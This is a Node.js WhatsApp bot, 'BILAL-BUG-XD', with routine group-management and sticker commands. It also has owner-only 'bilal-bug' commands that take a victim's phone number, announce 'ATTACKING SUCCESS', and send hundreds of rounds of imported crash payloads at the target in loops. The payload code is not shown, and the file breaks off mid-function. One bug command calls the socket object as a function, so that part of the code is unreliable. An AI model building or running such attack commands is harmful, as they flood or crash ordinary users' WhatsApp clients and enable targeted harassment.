const express = require('express');
require('./config')
const fs = require('fs-extra');
const { exec } = require("child_process");
const router = express.Router();
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const crypto = require('crypto');
const chalk = require("chalk");
const FileType = require('file-type');
const fetch = require('node-fetch');
const moment = require('moment-timezone');
const readline = require('readline');
const os = require('os');
const path = require('path');

// Import des dépendances du handler
const mime = require('mime-types');
const NodeCache = require('node-cache');
const util = require('util')
const axios = require('axios')
const { performance } = require('perf_hooks');
const { writeFile, unlink } = require('fs/promises');
const { Sticker, createSticker, StickerTypes } = require("wa-sticker-formatter");
const JavaScriptObfuscator = require('javascript-obfuscator');
const sharp = require('sharp');
const ffmpeg = require('fluent-ffmpeg');
const cheerio = require('cheerio');
const { promisify } = require('util');
const gis = promisify(require('g-i-s'));

const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./database/bilal-xd');
const { smsg, fetchJson, await: awaitfunc, sleep, getBuffer, getGroupAdmins, getSizeMedia, formatSize, checkBandwidth, formatp, reSize, isUrl, runtime } = require('./database/mylib');
const { devaskNotBot, dabraDelay1, BlankForce, protocolbug1 } = require('./database/bug');

const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    DisconnectReason,
    downloadContentFromMessage,
    jidDecode,
    proto,
    getContentType,
    generateWAMessage,
    generateWAMessageFromContent,
    generateWAMessageContent,
    prepareWAMessageMedia
} = require("@whiskeysockets/baileys");

// Variables globales
const global = {
    prefix: ".",
    owner: "24165726941",
    mode: "public",
    packname: "BILAL-BUG-XD",
    author: "BILEL KING"
};

const owner2 = [global.owner + "@s.whatsapp.net"];
const mess = {
    admin: "🚫 *Only administrators can use this command.*",
    group: "❌ *This command is for groups only.*",
    owner: "🔒 *This command is for owner only.*"
};

// Store pour gérer les données
const store = {
    messages: [],
    contacts: {},
    chats: {},
    async loadMessage(jid, id, conn) {
        return this.messages.find(m => m.key?.id === id && m.key?.remoteJid === jid);
    }
};

// ==================== HANDLER FUNCTION ====================
async function handleMessage(devaskNotBot, m, msg, store) { 
    try {   
        // Get command text
        let body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "interactiveResponseMessage" ? (() => {
                try {
                    return JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id;
                } catch {
                    return "";
                }
            })() :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "messageContextInfo" ?
                m.message.buttonsResponseMessage?.selectedButtonId ||
                m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
                m.message.interactiveResponseMessage?.nativeFlowResponseMessage ||
                m.text :
            ""
        );

        if (!body) body = "";

        const sender = m.key.fromMe ? devaskNotBot.user.id.split(":")[0] + "@s.whatsapp.net" || devaskNotBot.user.id : m.key.participant || m.key.remoteJid;
        const prefix = ".";
        if (!body.startsWith(prefix)) return;  

        const isCreator = owner2.includes(m.sender) ? true : m.sender == global.owner + "@s.whatsapp.net" ? true : m.fromMe ? true : false;
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : "";
        const args = body.trim().split(/ +/).slice(1);
        const text = args.join(" ");

        var crypto = require("crypto");
        const moment = require('moment-timezone');
        const time = moment().format("HH:mm:ss DD/MM");
        let { randomBytes } = require("crypto");
        const makeid = randomBytes(3).toString('hex');
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const botNumber = await devaskNotBot.decodeJid(devaskNotBot.user.id);
        const isGroup = m.chat.endsWith('@g.us');
        const senderNumber = m.sender.split('@')[0];
        const pushname = m.pushName || "No Name";
        const isBot = botNumber.includes(senderNumber);
        const groupMetadata = isGroup ? await devaskNotBot.groupMetadata(m.chat) : {};
        let participant_bot = isGroup ? groupMetadata.participants.find((v) => v.id == botNumber) : {};
        const groupName = isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const isBotAdmin = participant_bot?.admin !== null ? true : false;
        const isAdmin = participants?.find(p => p.id === m.sender)?.admin === "admin" ? true : false;

        // Vérification du mode public/privé
        if (!devaskNotBot.public) {
            if (!m.key.fromMe) return;
        }

        switch (command) {

            // ==================== MENU & INFORMATION ====================
            case 'menu': {
                await devaskNotBot.sendMessage(m.chat, { react: { text: "📁", key: m.key } }); 
                try {
                    const categories = [
                        {
                            title: "MENU",
                            desc: `
╭━━━⊰menu⊱━━━╮
├ ◦ public
├ ◦ private
├ ◦ promote
├ ◦ demote
├ ◦ kick
├ ◦ tagall
├ ◦ ping
├ ◦ jid
├ ◦ sticker
├ ◦ welcome 
├ ◦ goodbey
╰━━━━━━━━━━━━━━━╯`,
                            button: { text: "CHANNEL", url: "https://whatsapp.com/channel/0029Vaj3Xnu17EmtDxTNnQ0G/488" },
                            image: "https://i.ibb.co/qYG993MS/72a4e407f204.jpg"
                        },
                        {
                            title: "BUGMENU",
                            desc: `
╭━━━⊰bug-menu⊱━━━╮
├ ◦ bilal-bug
├ ◦ bilal-bug2
├ ◦ bilal-bug3
├ ◦ bilal-x-group
╰━━━━━━━━━━━━━━━╯`,
                            button: { text: "CHANNEL", url: "https://whatsapp.com/channel/0029Vaj3Xnu17EmtDxTNnQ0G/488" },
                            image: "https://i.ibb.co/qYG993MS/72a4e407f204.jpg"
                        }
                    ];

                    // Generate carousel cards with CTA buttons
                    const carouselCards = await Promise.all(
                        categories.map(async (item, index) => {
                            const imageMsg = (
                                await generateWAMessageContent(
                                    { image: { url: item.image } },
                                    { upload: devaskNotBot.waUploadToServer }
                                )
                            ).imageMessage;

                            return {
                                header: {
                                    title: item.title,
                                    hasMediaAttachment: true,
                                    imageMessage: imageMsg
                                },
                                body: { text: item.desc },
                                footer: { text: `📖 Page ${index + 1} of ${categories.length}` },
                                nativeFlowMessage: {
                                    buttons: [
                                        {
                                            name: "cta_url",
                                            buttonParamsJson: JSON.stringify({
                                                display_text: item.button.text,
                                                url: item.button.url,
                                                merchant_url: item.button.url
                                            })
                                        }
                                    ]
                                }
                            };
                        })
                    );

                    // Build the carousel message
                    const carouselMessage = generateWAMessageFromContent(
                        m.chat,
                        {
                            viewOnceMessage: {
                                message: {
                                    messageContextInfo: {
                                        deviceListMetadata: {},
                                        deviceListMetadataVersion: 2
                                    },
                                    interactiveMessage: {
                                        body: { text: "⿻l ꙰lBILAL⿻BUG-XD ꙰⿻" },
                                        footer: { text: "Swipe ⬅️➡️ to explore all commands" },
                                        carouselMessage: { cards: carouselCards }
                                    }
                                }
                            }
                        },
                        { quoted: m }
                    );

                    // Send carousel
                    await devaskNotBot.relayMessage(m.chat, carouselMessage.message, {
                        messageId: carouselMessage.key.id
                    });

                } catch (error) {
                    console.error("❌ Menu command error:", error);
                    await devaskNotBot.sendMessage(m.chat, { text: "⚠️ Failed to load menu. Please try again later." }, { quoted: m });
                }
            }
            break;

            case "ping": {
                const startTime = Date.now();
                await devaskNotBot.sendMessage(m.chat, { text: 'Pong 🧃!' }, { quoted: m });

                const latency = Date.now() - startTime;
                await devaskNotBot.sendMessage(m.chat, { text: `BILAL BUG XD :\n> ${latency}Ms` }, { quoted: m });   
            }
            break;

            // ==================== GROUP MANAGEMENT ====================
            case "welcome": {
                if (!isGroup) return devaskNotBot.sendMessage(m.chat, {
                    text: "❌ *This command is for groups only.*"
                }, { quoted: m });

                const groupAdmins = groupMetadata.participants?.filter(p => p.admin)?.map(p => p.id) || [];
                const isAdmin = groupAdmins.includes(m.sender) || m.key.fromMe;

                if (!isAdmin) return devaskNotBot.sendMessage(m.chat, {
                    text: "🚫 *Only administrators can use this command.*"
                }, { quoted: m });

                global.db = global.db || {};
                global.db.welcome = global.db.welcome || {};

                const arg = text?.toLowerCase();
                if (!["on", "off"].includes(arg)) {
                    return devaskNotBot.sendMessage(m.chat, {
                        text: `📌 *Usage:* ${prefix}welcome on/off`
                    }, { quoted: m });
                }

                const enable = arg === "on";
                global.db.welcome[m.chat] = enable;

                await devaskNotBot.sendMessage(m.chat, {
                    text: `👋 *Welcome message ${enable ? "enabled ✅" : "disabled ❌"}*`
                }, { quoted: m });

                // Built-in event for automatic sending
                devaskNotBot.ev.on('group-participants.update', async (update) => {
                    try {
                        const isWelcomeEnabled = global.db?.welcome?.[update.id];
                        if (!isWelcomeEnabled) return;

                        const metadata = await devaskNotBot.groupMetadata(update.id);

                        for (const participant of update.participants) {
                            if (update.action === 'add') {
                                const ppUser = await devaskNotBot.profilePictureUrl(participant, 'image').catch(() => 'https://i.ibb.co/rb6X4jQ/default.jpg');
                                const username = participant.split('@')[0];
                                const groupName = metadata.subject;

                                const welcomeText = `🎉 *Welcome to @${username} in the group ${groupName}!*\n\n💬 Introduce yourself or get to know the members!`;

                                await devaskNotBot.sendMessage(update.id, {
                                    image: { url: ppUser },
                                    caption: welcomeText,
                                    mentions: [participant]
                                });
                            }
                        }
                    } catch (err) {
                        console.log("Welcome error:", err);
                    }
                });
            } 
            break;

            case "goodbye": {
                if (!isGroup) return devaskNotBot.sendMessage(m.chat, {
                    text: "❌ *This command is for groups only.*"
                }, { quoted: m });

                const groupAdmins = groupMetadata.participants?.filter(p => p.admin)?.map(p => p.id) || [];
                const isAdmin = groupAdmins.includes(m.sender) || m.key.fromMe;

                if (!isAdmin) return devaskNotBot.sendMessage(m.chat, {
                    text: "🚫 *Only administrators can use this command.*"
                }, { quoted: m });

                global.db = global.db || {};
                global.db.goodbye = global.db.goodbye || {};

                const arg = text?.toLowerCase();
                if (!["on", "off"].includes(arg)) {
                    return devaskNotBot.sendMessage(m.chat, {
                        text: `📌 *Usage:* ${prefix}goodbye on/off`
                    }, { quoted: m });
                }

                const enable = arg === "on";
                global.db.goodbye[m.chat] = enable;

                await devaskNotBot.sendMessage(m.chat, {
                    text: `👋 *Goodbye message ${enable ? "enabled ✅" : "disabled ❌"}*`
                }, { quoted: m });

                // Built-in event for automatic sending
                devaskNotBot.ev.on('group-participants.update', async (update) => {
                    try {
                        const isGoodbyeEnabled = global.db?.goodbye?.[update.id];
                        if (!isGoodbyeEnabled) return;

                        const metadata = await devaskNotBot.groupMetadata(update.id);

                        for (const participant of update.participants) {
                            if (update.action === 'remove') {
                                const ppUser = await devaskNotBot.profilePictureUrl(participant, 'image').catch(() => 'https://i.ibb.co/rb6X4jQ/default.jpg');
                                const username = participant.split('@')[0];
                                const groupName = metadata.subject;

                                const goodbyeText = `😢 *@${username} left the group ${groupName}...*\n\nWe hope to see you again soon!`;

                                await devaskNotBot.sendMessage(update.id, {
                                    image: { url: ppUser },
                                    caption: goodbyeText,
                                    mentions: [participant]
                                });
                            }
                        }
                    } catch (err) {
                        console.log("Goodbye error:", err);
                    }
                });
            }
            break;

            case "promote":
            case "promot": {
                if (!isGroup) return devaskNotBot.sendMessage(m.chat, { text: "For groups only" }, { quoted: m });
                if (!isAdmin && !isCreator) return devaskNotBot.sendMessage(m.chat, { text: "Command reserved for group administrators only" }, { quoted: m });
                if (!isBotAdmin) return devaskNotBot.sendMessage(m.chat, { text: "The bot is not administrator" }, { quoted: m });

                if (m.quoted || text) {
                    let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                    await devaskNotBot.groupParticipantsUpdate(m.chat, [target], 'promote')
                    .then((res) => devaskNotBot.sendMessage(m.chat, { text: `User ${target.split("@")[0]} is now administrator` }, { quoted: m }))
                    .catch((err) => devaskNotBot.sendMessage(m.chat, { text: err.toString() }, { quoted: m }));
                } else {
                    return devaskNotBot.sendMessage(m.chat, { text: "Example: 241XXX/@tag" }, { quoted: m });
                }
            }
            break; 

            case "demote": {
                if (!isGroup) return devaskNotBot.sendMessage(m.chat, { text: "Group Only" }, { quoted: m });
                if (!isAdmin && !isCreator) return devaskNotBot.sendMessage(m.chat, { text: "Admin Only" }, { quoted: m });
                if (!isBotAdmin) return devaskNotBot.sendMessage(m.chat, { text: "The bot is not administrator in this group" }, { quoted: m });

                if (m.quoted || text) {
                    let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                    await devaskNotBot.groupParticipantsUpdate(m.chat, [target], 'demote')
                    .then((res) => devaskNotBot.sendMessage(m.chat, { text: `Member ${target.split("@")[0]} is no longer administrator in this group` }, { quoted: m }))
                    .catch((err) => devaskNotBot.sendMessage(m.chat, { text: err.toString() }, { quoted: m }));
                } else {
                    return devaskNotBot.sendMessage(m.chat, { text: "Example: 241XX" }, { quoted: m });
                }
            }
            break;

            case "open": {
                if (!isGroup) return devaskNotBot.sendMessage(m.chat, { text: 'For groups only' }, { quoted: m });
                if (!isBotAdmin) return devaskNotBot.sendMessage(m.chat, { text: 'the bot is not admin' }, { quoted: m });
                if (!isAdmin && !isCreator) return devaskNotBot.sendMessage(m.chat, { text: mess.admin }, { quoted: m });
                await devaskNotBot.groupSettingUpdate(m.chat, 'not_announcement');
                devaskNotBot.sendMessage(m.chat, { text: "*GROUP SETTINGS CHANGED ✅*\neveryone can send messages in the group" }, { quoted: m });
            }
            break;

            case "close": {
                if (!isGroup) return devaskNotBot.sendMessage(m.chat, { text: mess.group }, { quoted: m });
                if (!isBotAdmin) return devaskNotBot.sendMessage(m.chat, { text: 'you are not admin' }, { quoted: m });
                if (!isAdmin && !isCreator) return devaskNotBot.sendMessage(m.chat, { text: mess.admin }, { quoted: m });
                await devaskNotBot.groupSettingUpdate(m.chat, 'announcement');
                devaskNotBot.sendMessage(m.chat, { text: "*GROUP SETTINGS SUCCESSFULLY CHANGED ✅*\nonly admins can send messages" }, { quoted: m });
            }
            break;

            case 'kick': {
                if (!isGroup) return devaskNotBot.sendMessage(m.chat, { text: 'For groups only' }, { quoted: m });
                if (!isCreator && !isAdmin) return devaskNotBot.sendMessage(m.chat, { text: mess.admin }, { quoted: m });
                if (!isBotAdmin) return devaskNotBot.sendMessage(m.chat, { text: "✖️ *The bot must be administrator*" }, { quoted: m });

                if (text || m.quoted) {
                    const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;
                    var onWa = await devaskNotBot.onWhatsApp(input.split("@")[0]);

                    if (onWa.length < 1) return devaskNotBot.sendMessage(m.chat, { text: "Number not registered on WhatsApp" }, { quoted: m });

                    const res = await devaskNotBot.groupParticipantsUpdate(m.chat, [input], 'remove');
                    await devaskNotBot.sendMessage(m.chat, { text: `Success: ${input.split("@")[0]} has been kicked from the group` }, { quoted: m });
                } else {
                    return devaskNotBot.sendMessage(m.chat, { text: "Send the command with text:\n.kick @tag/reply" }, { quoted: m });
                }
            }
            break;

            case "tagall":
            case "tag": {
                await devaskNotBot.sendMessage(m.chat, { react: { text: "📣", key: m.key } });

                if (!isCreator && !isAdmin) return devaskNotBot.sendMessage(m.chat, { text: mess.admin }, { quoted: m });
                if (!isGroup) return devaskNotBot.sendMessage(m.chat, { text: mess.group }, { quoted: m });

                let teks = "*BILAL-BUG-XD*\n" +
                    `*Message* : ${text ? text : ''}\n╭──♕ BILAL-BUG-XD ♕ ──╮\n`;

                for (let mem of participants) {
                    teks += `│ ❖ @${mem.id.split('@')[0]}\n`;
                }
                teks += `╰━━━━━━━━━━━━━━━╯`;

                // Send message with image
                await devaskNotBot.sendMessage(m.chat, {
                    image: { url: 'https://i.ibb.co/qYG993MS/72a4e407f204.jpg' },
                    caption: teks,
                    mentions: participants.map(a => a.id)
                }, { quoted: m });
            }
            break;

            // ==================== MEDIA & STICKERS ====================
            case 'sticker': 
            case 's': {
                if (!quoted) return devaskNotBot.sendMessage(m.chat, { text: `Reply Image or Video with command ${prefix + command}` }, { quoted: m });

                if (/image/.test(mime)) {
                    let media = await quoted.download();
                    let encmedia = await devaskNotBot.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                    await fs.unlinkSync(encmedia);
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 17) return devaskNotBot.sendMessage(m.chat, { text: 'max 17s' }, { quoted: m });

                    let media = await quoted.download();
                    let encmedia = await devaskNotBot.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                    await fs.unlinkSync(encmedia);
                } else {
                    return devaskNotBot.sendMessage(m.chat, { text: `Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s` }, { quoted: m });
                }
            }
            break;

            // ==================== BOT OWNER & SPECIAL ====================
            case 'bilal-bug': {
                if (!isCreator) return devaskNotBot.sendMessage(m.chat, { text: mess.owner }, { quoted: m });
                if (!text) return devaskNotBot.sendMessage(m.chat, { text: "241xxx or tag @user" }, { quoted: m });

                let mentionedJid;
                let lockNum;
                if (m.mentionedJid?.length > 0) {
                    mentionedJid = m.mentionedJid[0];
                    lockNum = mentionedJid.split('@')[0];
                } else {
                    let jidx = text.replace(/[^0-9]/g, "");
                    if (jidx.startsWith('0')) return devaskNotBot.sendMessage(m.chat, { text: 'use command + 241xxxx' }, { quoted: m });
                    mentionedJid = `${jidx}@s.whatsapp.net`;
                    lockNum = `${jidx}`;
                }
                let target = mentionedJid;
                let lock = lockNum;
                let teks = `「 ATTACKING SUCCESS 」\n\n𖥂 TARGET : *${lock}*\n𖥂 VIRUS : *${command}*\n\n\`—( Note )\`\n> Please pause after sending bug`;
                await devaskNotBot.sendMessage(m.chat, { text: teks }, { quoted: m });

                for (let i = 0; i < 400; i++) {
                    console.log(chalk.green(`© - Invisible\n𖥂 Protocolbug1 : ${i}/400\n𖥂 Target : ${target}`));
                    await protocolbug1(devaskNotBot, target, false);
                }
            }
            break;

            case 'bilal-bug2': {
                if (!isCreator) return devaskNotBot.sendMessage(m.chat, { text: mess.owner }, { quoted: m });
                if (!text) return devaskNotBot.sendMessage(m.chat, { text: "241xxx or tag @user" }, { quoted: m });

                let mentionedJid;
                let lockNum;
                if (m.mentionedJid?.length > 0) {
                    mentionedJid = m.mentionedJid[0];
                    lockNum = mentionedJid.split('@')[0];
                } else {
                    let jidx = text.replace(/[^0-9]/g, "");
                    if (jidx.startsWith('0')) return devaskNotBot.sendMessage(m.chat, { text: 'use command + 241xxxx' }, { quoted: m });
                    mentionedJid = `${jidx}@s.whatsapp.net`;
                    lockNum = `${jidx}`;
                }
                let target = mentionedJid;
                let lock = lockNum;
                let teks = `「 ATTACKING SUCCESS 」\n\n𖥂 TARGET : *${lock}*\n𖥂 VIRUS : *${command}*\n\n\`—( Note )\`\n> Please pause after sending bug`;
                await devaskNotBot.sendMessage(m.chat, { text: teks }, { quoted: m });

                for (let i = 0; i < 400; i++) {
                    console.log(chalk.green(`© - Invisible\n𖥂 Protocolbug1 : ${i}/400\n𖥂 Target : ${target}`));
                    await dabraDelay1(devaskNotBot, target, false);
                    await BlankForce(devaskNotBot, target, false);
                }
            }
            break;

            case 'bilal-bug3': {
                if (!isCreator) return devaskNotBot.sendMessage(m.chat, { text: mess.owner }, { quoted: m });
                if (!text) return devaskNotBot.sendMessage(m.chat, { text: "241xxx or tag @user" }, { quoted: m });

                let mentionedJid;
                let lockNum;
                if (m.mentionedJid?.length > 0) {
                    mentionedJid = m.mentionedJid[0];
                    lockNum = mentionedJid.split('@')[0];
                } else {
                    let jidx = text.replace(/[^0-9]/g, "");
                    if (jidx.startsWith('0')) return devaskNotBot.sendMessage(m.chat, { text: 'use command + 241xxxx' }, { quoted: m });
                    mentionedJid = `${jidx}@s.whatsapp.net`;
                    lockNum = `${jidx}`;
                }
                let target = mentionedJid;
                let lock = lockNum;
                let teks = `「 ATTACKING SUCCESS 」\n\n𖥂 TARGET : *${lock}*\n𖥂 VIRUS : *${command}*\n\n\`—( Note )\`\n> Please pause after sending bug`;
                await devaskNotBot.sendMessage(m.chat, { text: teks }, { quoted: m });

                for (let i = 0; i < 200; i++) {
                    console.log(chalk.green(`© - Invisible\n𖥂 bug : ${i}/400\n𖥂 Target : ${target}`));
                    await devaskNotBot(devaskNotBot, target, false);
                    await BlankForce(devaskNotBot, target, false);
                    await dabraDelay1(devaskNotBot, target, false);
                }
            }
            break;

            case "jid": {
                if (!isCreator) return devaskNotBot.sendMessage(m.chat, { text: mess.owner }, { quoted: m });
                devaskNotBot.sendMessage(m.chat, { text: `BILAL BUG XD\n𝖸𝖮𝖴𝖱 𝖩𝖨𝖣 😋 ${m.chat}` }, { quoted: m });
            }
            break;

            case "private": {
                await devaskNotBot.sendMessage(m.chat, { react: { text: "🔒", key: m.key } });
                if (!isCreator) return devaskNotBot.sendMessage(m.chat, { text: 'For Owner Only' }, { quoted: m });
                devaskNotBot.public = false;
                devaskNotBot.sendMessage(m.chat, { text: 'PRIVATE MODE ACTIVATED' }, { quoted: m });
            }
            break;

            case "public": {
                await devaskNotBot.sendMessage(m.chat, { react: { text: "🔓", key: m.key } });
                if (!isCreator) return devaskNotBot.sendMessage(m.chat, { text: 'For Owner Only' }, { quoted: m });
                devaskNotBot.public = true;
                devaskNotBot.sendMessage(m.chat, { text: 'PUBLIC MODE ACTIVATED' }, { quoted: m });
            }
            break;

            // ==================== DEFAULT HANDLER ====================
            default: {
                await devaskNotBot.sendMessage(m.chat, { react: { text: "❌", key: m.key } });

                await devaskNotBot.sendMessage(m.chat, {
                    image: { url: "https://i.ibb.co/qYG993MS/72a4e407f204.jpg" },
                    caption: "> Command not recognized, type *.menu* to see available options."
                }, { quoted: m });
            }
            break;
        }
    } catch (err) {        
        console.log(chalk.red("Error in handler function =>"), err);
    }
}

// ==================== MAIN BOT FUNCTION ====================
router.get('/', async (req, res) => {
    let num = req.query.number;

    async function BILALXD(DevNotBot) {
        const { state, saveCreds } = await useMultiFileAuthState(`./session`);

        try {
            const devaskNotBot = makeWASocket({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: Browsers.macOS("Safari"),
            });

            if (!devaskNotBot.authState.creds.registered) {
                await delay(1500);
                num = num.replace(/[^0-9]/g, '');
                const code = await devaskNotBot.requestPairingCode(num);
                if (!res.headersSent) await res.send({ code });
            }

            devaskNotBot.decodeJid = (jid) => {
                if (!jid) return jid;
                if (/:\d+@/gi.test(jid)) {
                    const decode = jidDecode(jid) || {};
                    return decode.user && decode.server && `${decode.user}@${decode.server}` || jid;
                }
                return jid;
            };

            // Function Message and connexion 
            devaskNotBot.ev.on("connection.update", async (update) => {
                const { connection, lastDisconnect } = update;
                if (connection === 'open') {
                    try {
                        // Envoi du message de connexion
                        await devaskNotBot.sendMessage(devaskNotBot.user.id, {
                            image: { url: 'https://i.ibb.co/qYG993MS/72a4e407f204.jpg' },
                            caption: `
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
█░░║║║╠─║─║─║║║║║╠─░░█
█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█ 𝐁𝐈𝐋𝐀𝐋 𝐁𝐔𝐆 𝐗𝐃               
█ 𝐁𝐘 𝐁𝐈𝐋𝐄𝐋 𝐊𝐈𝐍𝐆            
█ 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 1.0.0               
█ 𝐏𝐑𝐄𝐅𝐈𝐗: *${global.prefix}*                  
█ 𝐎𝐖𝐍𝐄𝐑: *${global.owner}*
█ 𝐌𝐎𝐃𝐄: *${global.mode}*
█ 𝐂𝐌𝐃: 𝐮𝐬𝐞 .𝐦𝐞𝐧𝐮
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
`
                        });
                    } catch (e) {
                        console.log(chalk.yellow("⚠️ Erreur lors de l'envoi du message de connexion:"), e);
                    }

                    console.log(chalk.green('🤖 Bot connecté!'));
                    console.log(chalk.blue('✅ Commandes maintenant actives!'));

                } else if (connection === 'close') {
                    const reason = lastDisconnect?.error?.output?.statusCode;
                    if (reason === DisconnectReason.badSession) {
                        console.warn(chalk.red('❌ Mauvaise session, supprimez la session et scannez à nouveau.'));
                        process.exit();
                    } else if (reason === DisconnectReason.connectionClosed) {
                        console.warn(chalk.yellow('🔄 Connexion fermée, tentative de reconnexion...'));
                        await sleep(5000);
                        BILALXD();
                    } else if (reason === DisconnectReason.connectionLost) {
                        console.warn(chalk.yellow('🔄 Connexion perdue, tentative de reconnexion...'));
                        await sleep(5000);
                        BILALXD();
                    } else if (reason === DisconnectReason.connectionReplaced) {
                        console.warn(chalk.red('🔁 Session remplacée, déconnexion...'));
                        devaskNotBot.logout();
                    } else if (reason === DisconnectReason.loggedOut) {
                        console.warn(chalk.red('🚪 Déconnecté, veuillez scanner à nouveau.'));
                        devaskNotBot.logout();
                    } else if (reason === DisconnectReason.restartRequired) {
                        console.warn(chalk.yellow('🔄 Redémarrage requis, redémarrage...'));
                        await BILALXD();
                    } else if (reason === DisconnectReason.timedOut) {
                        console.warn(chalk.yellow('⏰ Connexion expirée, tentative de reconnexion...'));
                        await sleep(5000);
                        BILALXD();
                    } else {
                        console.warn(chalk.yellow('🔄 Connexion fermée, tentative de reconnexion...'));
                        await sleep(5000);
                        BILALXD();
                    }
                } else if (connection === "connecting") {
                    console.warn(chalk.blue('🔄 Connexion en cours...'));
                }
            });

            // Gestion des messages - CORRIGÉ
            devaskNotBot.ev.on('messages.upsert', async ({ messages, type }) => {
                try {
                    const msg = messages[0];
                    if (!msg || !msg.message) return;
                    if (type !== "notify") return;

                    // Auto-like status
                    if (msg.key && msg.key.remoteJid === "status@broadcast") {
                        await devaskNotBot.readMessages([msg.key]);
                        await devaskNotBot.sendMessage(msg.key.remoteJid, { react: { text: "❤️", key: msg.key } });
                        return;
                    }

                    // Stocker le message
                    store.messages.push(msg);

                    // Préparer le message avec smsg
                    const m = smsg(devaskNotBot, msg, store);

                    console.log(chalk.yellow(`📨 Message de: ${m.sender}`));
                    console.log(chalk.cyan(`💬 Texte: ${m.text || m.body || '[Media]'}`));

                    // Appeler le handler directement
                    await handleMessage(devaskNotBot, m, msg, store);

                } catch (err) {
                    console.error(chalk.red('❌ Erreur dans messages.upsert:'), err);
                }
            });

            // Auto-recording Présence Online
            devaskNotBot.ev.on('messages.upsert', async ({ messages }) => {
                try {
                    const msg = messages[0];
                    if (!msg) return;
                    await devaskNotBot.sendPresenceUpdate('recording', msg.key.remoteJid);
                    await sleep(40000);
                    await devaskNotBot.sendPresenceUpdate('paused', msg.key.remoteJid);
                } catch (err) {
                    console.error(chalk.yellow('⚠️ Erreur presence update:'), err);
                }
            });

            // Gestion des contacts
            devaskNotBot.ev.on('contacts.update', update => {
                for (let contact of update) {
                    let id = devaskNotBot.decodeJid(contact.id);
                    if (store && store.contacts) {
                        store.contacts[id] = { id, name: contact.notify };
                    }
                }
            });

            // Fonctions utilitaires (stickers, etc.)
            devaskNotBot.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
                let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
                let buffer = options && (options.packname || options.author) ? await writeExifImg(buff, options) : await imageToWebp(buff);
                await devaskNotBot.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted });
                return buffer;
            };

            devaskNotBot.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
                let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
                let buffer = options && (options.packname || options.author) ? await writeExifVid(buff, options) : await videoToWebp(buff);
                await devaskNotBot.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted });
                return buffer;
            };

            devaskNotBot.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
                let quoted = message.msg ? message.msg : message;
                let mime = (message.msg || message).mimetype || '';
                let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
                const stream = await downloadContentFromMessage(quoted, messageType);
                let buffer = Buffer.from([]);
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk]);
                }
                let type = await FileType.fromBuffer(buffer);
                let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
                await fs.writeFileSync(trueFileName, buffer);
                return trueFileName;
            };

            devaskNotBot.sendTextWithMentions = async (jid, text, quoted, options = {}) => devaskNotBot.sendMessage(jid, { text: text, mentions: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net'), ...options }, { quoted });

            devaskNotBot.downloadMediaMessage = async (message) => {
                let mime = (message.msg || message).mimetype || '';
                let messageType = message.mtype 
                    ? message.mtype.replace(/Message/gi, '') 
                    : mime.split('/')[0];

                const stream = await downloadContentFromMessage(message, messageType);
                let buffer = Buffer.from([]);

